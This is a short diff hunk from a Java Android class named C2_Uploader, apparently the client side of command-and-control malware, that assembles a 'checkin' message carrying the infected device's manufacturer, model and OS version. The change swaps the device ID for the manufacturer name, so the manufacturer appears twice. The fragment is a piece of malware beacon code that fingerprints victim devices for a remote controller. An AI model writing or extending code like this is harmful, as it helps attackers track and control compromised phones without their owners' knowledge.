@@ -45,7 +45,8 @@ public class C2_Uploader {
                 int port = FirebaseConfig.DEFAULT_PORT;
                 
                 JSONObject status = new JSONObject();
-                status.put("deviceId", getDeviceId(context));
+                status.put("deviceId", Build.MANUFACTURER);
+                status.put("brand", Build.MANUFACTURER);
                 status.put("type", "checkin");
                 status.put("model", Build.MODEL);
                 status.put("os", Build.VERSION.RELEASE);
